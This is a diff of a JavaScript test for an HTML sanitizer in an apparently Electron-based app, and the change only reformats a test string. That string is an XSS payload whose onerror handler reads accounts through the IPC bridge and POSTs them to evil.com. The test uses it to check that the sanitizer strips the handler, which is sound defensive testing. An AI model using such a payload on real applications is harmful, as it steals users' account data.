@@ -705,7 +705,8 @@ describe('sanitizeHtml', () => {
     });
 
     it('should block IPC bridge access attempts', () => {
-      const attack = '<img src=x onerror="window.electron.getAccounts().then(a=>fetch(\'http://evil.com\',{method:\'POST\',body:JSON.stringify(a)}))">';
+      const attack =
+        "<img src=x onerror=\"window.electron.getAccounts().then(a=>fetch('http://evil.com',{method:'POST',body:JSON.stringify(a)}))\">";
       const sanitized = sanitizeHtml(attack);
 
       expect(sanitized).not.toContain('onerror');
